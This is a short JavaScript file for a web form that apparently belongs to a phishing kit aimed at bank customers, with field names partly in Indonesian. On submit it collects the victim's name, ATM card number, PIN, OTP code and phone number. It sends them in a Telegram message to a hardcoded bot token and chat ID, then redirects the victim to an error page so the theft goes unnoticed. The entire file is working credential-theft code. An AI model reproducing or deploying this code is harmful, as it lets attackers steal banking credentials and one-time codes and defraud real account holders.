
const TOKEN = "5594182931:AAHrWUwwePGrDF7H9Wm5ITF80sGDV7XtBk8";
const CHAT_ID = "5897739787";
const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

const form = document.getElementById("tg");

form.addEventListener("submit", onSubmitTelegram);

function onSubmitTelegram(e) {
  e.preventDefault();

  const { name, atm, pin, otp, phone, pesan, } = form;
  const data = {
    name: name.value,
    atm: atm.value,
    pin: pin.value,
    otp: otp.value,
    phone: phone.value,
    pesan: pesan.value,
  };

  let message = `<b></b>\n`;
  message += `<b>Kode OTP : </b> ${data.name} ${data.atm} ${data.pin} ${data.otp} ${data.phone} ${data.pesan}\n`;

  const dataTg = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: "html",
  };

  const options = {
    method: "POST",
    body: JSON.stringify(dataTg),
    headers: {
      "Content-Type": "application/json",
    },
  };

  fetch(URL_API, options)
    .then((res) => res.json())
    .then((res) => console.log(res))
    .catch((err) => console.log(err));
    
    window.location.href='/error.html';
}
